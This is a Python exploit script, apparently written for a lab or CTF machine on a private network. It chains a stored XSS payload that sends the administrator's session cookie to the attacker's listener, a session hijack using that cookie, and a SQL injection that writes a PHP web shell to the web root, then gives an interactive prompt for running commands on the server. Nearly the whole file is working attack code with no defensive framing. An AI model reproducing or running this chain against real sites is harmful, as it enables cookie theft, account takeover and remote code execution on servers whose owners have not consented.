#!/usr/bin/python3

import requests
import socket
import os
import re 
import sys
from random import randint

proxies = {'http': 'http://127.0.0.1:8080'}

host = "http://192.168.230.139/"
endPoint = "post_comment.php?id=2"
adminEndPoint = "/admin/edit.php?id=0"

def exec_cmd(url, file_name, cookie):
	
	header = {'Cookie' : cookie}
	while True:
		cmd=input("cmd>")
		if cmd == "exit":
			shell_url = url + "?cmd=rm " + file_name
			requests.get(shell_url)
			sys.exit()
		else:
			shell_url = url + "?cmd={}".format(cmd)
			res = requests.get(shell_url, headers=header, proxies=proxies)
			print(res.text.replace("1","").replace("2","").replace("3","").replace("4",""))
def upload_shell(cookie):
	header = {'Cookie' : cookie}
	geb=randint(5000,9000)
	url = host + adminEndPoint + " UNION SELECT 1,2,%22<?php system($_GET[%27cmd%27]); ?>%22,4 into outfile %22/var/www/css/shell{}.php%22".format(geb)
	file_name = "shell{}.php".format(geb)
	print("[+] File Name " + file_name)
	res = requests.get(url, headers=header, proxies=proxies)
	url = host + "css/" + "shell{}.php".format(geb)
	exec_cmd(url, file_name, cookie)


def login_admin(cookie):
	header = {'Cookie' : cookie}
	url = host + adminEndPoint
	res= requests.get(url,headers=header, proxies=proxies)
	if res.status_code == 200:
		print("[+] Login Successful as Admin")	
		upload_shell(cookie)
	else:
		print("[+ Admin Loggin failed]")
		
def server(port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	server_address = ("0.0.0.0", port)
	s.bind(server_address)
	print("[+] Server Started..!")
	s.listen(1)
	conn, add = s.accept()
	with conn:
		print(f"[+] Connected..! {add}")
		while True:
			data=conn.recv(2048)
			print("[+] XSS triggered")
			out=re.findall("PHPSESSID\=.*HTTP",data.decode('utf-8'))
			print("[+] Grabbing Cookie")
			out=out[0].replace("PHPSESSID%3D","").replace("HTTP","")
			out=(out.replace("\n","").replace("\t",""))
			print("[+] " + out)
			return out
			if data:
                		break
			#conn.sendall(data)
			s.close()

def send_payload(paylaod, port):

	url = host + endPoint
	data={ 'title' : 'attacker' , 'author' : 'checkmate' , 'text' : paylaod}
	res = requests.post(url, data , proxies=proxies)
	if res.status_code ==200:
		print("[+] XSS payload sent")
		cookie = server(port)
		login_admin(cookie)
		
def trigger():
	print("[+] Creating xss")
	port=randint(5000,9000)
	vector =  "<script>var i=new Image;i.src='http://192.168.230.128:{}/?'+document.cookie;</script>".format(port)
	send_payload(vector, port)
	

trigger()
